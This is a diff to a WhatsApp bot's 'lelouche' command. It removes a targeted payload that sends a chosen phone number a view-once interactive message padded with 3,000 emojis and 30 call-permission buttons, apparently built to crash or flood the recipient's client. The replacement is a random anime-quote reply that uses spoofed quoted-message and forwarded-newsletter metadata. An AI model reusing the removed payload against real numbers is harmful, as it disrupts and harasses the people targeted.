@@ -1,60 +1,54 @@
-// commands/lelouche.js
-const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];
+// commands/lelouche.js - Lelouch Quote
+const axios = require('axios');
+const settings = require('../settings');
 
-async function leloucheCommand(sock, chatId, message, args) {
-    if (!message.key.fromMe) {
-        await sock.sendMessage(chatId, { text: "❌ *Owner Only*" }, { quoted: message });
-        return;
+const fakeMeta = {
+    key: {
+        participant: '0@s.whatsapp.net',
+        remoteJid: 'status@broadcast',
+        fromMe: false,
+        id: 'DARKNODE_META_' + Date.now()
+    },
+    message: {
+        contactMessage: {
+            displayName: 'DARKNODE MD',
+            vcard: `BEGIN:VCARD\nVERSION:3.0\nN:DARKNODE MD;;;;\nFN:DARKNODE MD\nTEL;waid=${settings.ownerNumber}:+${settings.ownerNumber}\nEND:VCARD`,
+            sendEphemeral: true
+        }
+    },
+    messageTimestamp: Math.floor(Date.now() / 1000),
+    pushName: 'DARKNODE MD'
+};
+
+const channelInfo = {
+    contextInfo: {
+        forwardingScore: 1,
+        isForwarded: true,
+        forwardedNewsletterMessageInfo: {
+            newsletterJid: settings.newsletterJid,
+            newsletterName: settings.newsletterName,
+            serverMessageId: -1
+        }
     }
+};
 
-    const targetNumber = args[0];
-    if (!targetNumber) {
-        await sock.sendMessage(chatId, { 
-            text: "👑 *Lelouch vi Britannia*\n\nUsage: .lelouche <number>\nExample: .lelouche 628123456789\n\n*All Hail Lelouch!*"
-        }, { quoted: message });
-        return;
-    }
-
-    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
-    
-    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
-        await sock.sendMessage(chatId, { text: "🛡️ *Protected by Geass*" }, { quoted: message });
-        return;
-    }
-
-    const target = cleanNumber + '@s.whatsapp.net';
-    
-    await sock.sendMessage(chatId, { text: `👑 *Geass* activating on ${cleanNumber}...` }, { quoted: message });
-    await sock.sendMessage(chatId, { react: { text: "👑", key: message.key } });
-
+async function leloucheCommand(sock, chatId, message) {
     try {
-        const geassPayload = {
-            viewOnceMessage: {
-                message: {
-                    interactiveMessage: {
-                        contextInfo: {
-                            mentionedJid: [target],
-                            isForwarded: true,
-                            forwardingScore: 999
-                        },
-                        body: { text: "✦ Łḗḽǿüċḧ vī Ḃṛīƭȧṅṅīȧ ✦" + "👑".repeat(3000) },
-                        footer: { text: "Geass" },
-                        nativeFlowMessage: {
-                            buttons: Array(30).fill({ name: "call_permission_request", buttonParamsJson: "" })
-                        }
-                    }
-                }
-            }
-        };
+        const quotes = [
+            '"I am not a villain. I am a hero."',
+            '"The only ones who should kill are those who are prepared to be killed."',
+            '"If you are not strong enough to protect your ideals, then abandon them."',
+            '"A world without pain and hardship is a world without meaning."'
+        ];
+        const quote = quotes[Math.floor(Math.random() * quotes.length)];
 
-        await sock.relayMessage(target, geassPayload, { participant: { jid: target } });
-        
-        await sock.sendMessage(chatId, { text: `✅ *Geass* activated on ${cleanNumber}` }, { quoted: message });
-        await sock.sendMessage(chatId, { react: { text: "👁️", key: message.key } });
+        await sock.sendMessage(chatId, {
+            text: `╭─── ⪨ 🎭 LELOUCH ⪩───⟢\n│ ${quote}\n╰────────────⟢\n> © DarkNode MD`,
+            ...channelInfo
+        }, { quoted: message });
 
     } catch (error) {
-        console.error('[Lelouche]', error.message);
-        await sock.sendMessage(chatId, { text: `❌ *Geass failed:* ${error.message}` }, { quoted: message });
+        console.error('[Lelouche] Error:', error);
     }
 }
 
